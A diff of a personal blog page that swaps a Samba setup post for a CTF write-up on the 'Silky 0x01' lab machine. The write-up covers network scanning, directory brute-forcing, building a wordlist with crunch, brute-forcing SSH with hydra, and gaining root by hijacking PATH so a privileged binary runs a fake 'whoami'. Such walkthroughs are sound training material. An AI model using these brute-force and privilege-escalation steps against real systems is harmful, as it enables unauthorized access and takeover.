@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>set up smb | Peanutstick</title>
+  <title>CTF Silky 0x01 | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="set up smb | Peanutstick">
+  <meta name="description" content="CTF Silky 0x01 | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="netdiscover192.168.0.12 rustscanrustscan -a 192.168.0.12  gobustergobuster dir -u http:&#x2F;&#x2F;192.168.0.12 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt -x html,php,txt  gobuster dir -u http:&#x2F;&#x2F;192.16">
 <meta property="og:type" content="article">
@@ -885,9 +885,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-set_up_smb" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CTF_Silky_0x01" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">set up smb</h1>
+        <h1 class="article-title">CTF Silky 0x01</h1>
     
     <div class="article-meta">
         
@@ -897,7 +897,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Service">Service</a>
+            <a  data-rel="CTF">CTF</a>
             
         </span>
         
@@ -912,12 +912,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-01-15 22:16:47'>2022-01-16 05:01</time>
+            Created At : <time class="date" title='Updated At: 2022-06-12 11:24:39'>2022-06-12 18:44</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:111</span>
+        <span>Count:210</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -936,7 +936,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Clients"><span class="toc-text">Clients</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nautilus"><span class="toc-text">Nautilus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smbclient"><span class="toc-text">smbclient</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Wordlist"><span class="toc-text">Wordlist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hydra"><span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lse"><span class="toc-text">lse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#usr-bin-sky"><span class="toc-text">&#x2F;usr&#x2F;bin&#x2F;sky</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -952,17 +952,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h1><p>sudo pacman -S samba gvfs gvfs-smb # install relevant samba packages</p>
-<p>sudo nano <code>/etc/samba/smb.conf</code> (if it’s empty get a default smb.conf from Samba Git Repository and paste it into.</p>
-<p>Under [global] set:<br>workgroup = WORKGROUP</p>
-<p>sudo systemctl start smbd nmbd # start samba now</p>
-<h1 id="Clients"><a href="#Clients" class="headerlink" title="Clients"></a>Clients</h1><h2 id="Nautilus"><a href="#Nautilus" class="headerlink" title="Nautilus"></a>Nautilus</h2><p>It’s easy to use, you have to click to ‘another location’ and connect to a server:<br><code>smb://IP</code></p>
-<p>You gonna see your shared files.<br>Now if you want to browse them via CLI:<br><code>/run/user/&lt;username&gt;/gvfs/&lt;share point&gt;</code></p>
-<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">smbclient -L &lt;server&gt; # To list the shares
-smbclient &#x2F;&#x2F;serveur&#x2F;partage # To connect to the share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+        <h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><p><img src="https://i.imgur.com/rVvJcAI.png"><br>192.168.0.12</p>
+<h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rustscan -a <span class="token number">192.168</span>.0.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/MAbyiYb.png"></p>
+<h1 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/Ugr6CbZ.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a href="http://192.168.0.12/notes.txt">http://192.168.0.12/notes.txt</a></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem.
 
+I really need to remove the password from the page, after all the last 2 characters are missing. But still.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>view-source:<a href="http://192.168.0.12/script.js">http://192.168.0.12/script.js</a><br>//  s1lKy</p>
+<h1 id="Wordlist"><a href="#Wordlist" class="headerlink" title="Wordlist"></a>Wordlist</h1><p>So the password should be at 7 charachters.<br>Let’s create a wordlist with <code>crunch</code>.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> -t s1lKy^% <span class="token operator">></span> pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l silky -P pass <span class="token number">192.168</span>.0.12 -t <span class="token number">10</span> -V <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/wZvIbiA.png"></p>
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ssilky@192.168.0.12
+s1lKy<span class="token comment">#5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h1><p><img src="https://i.imgur.com/HWPnhbd.png"></p>
+<p><img src="https://i.imgur.com/i0PgW0K.png"></p>
+<h1 id="usr-bin-sky"><a href="#usr-bin-sky" class="headerlink" title="/usr/bin/sky"></a>/usr/bin/sky</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
+gezeichnet:
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:<br><img src="https://i.imgur.com/56vGGmK.png"><br>He use whoami as root, let’s create our own whoami file.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp
+<span class="token builtin class-name">echo</span> <span class="token string">"/bin/sh"</span> <span class="token operator">></span> <span class="token function">whoami</span>
+<span class="token function">chmod</span> +x <span class="token function">whoami</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/tmp:<span class="token environment constant">$PATH</span>"</span>
+/usr/bin/sky<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/CcmiLzj.png"><br>The flag:<br><img src="https://i.imgur.com/dCn81Wb.png"></p>
 
       
        
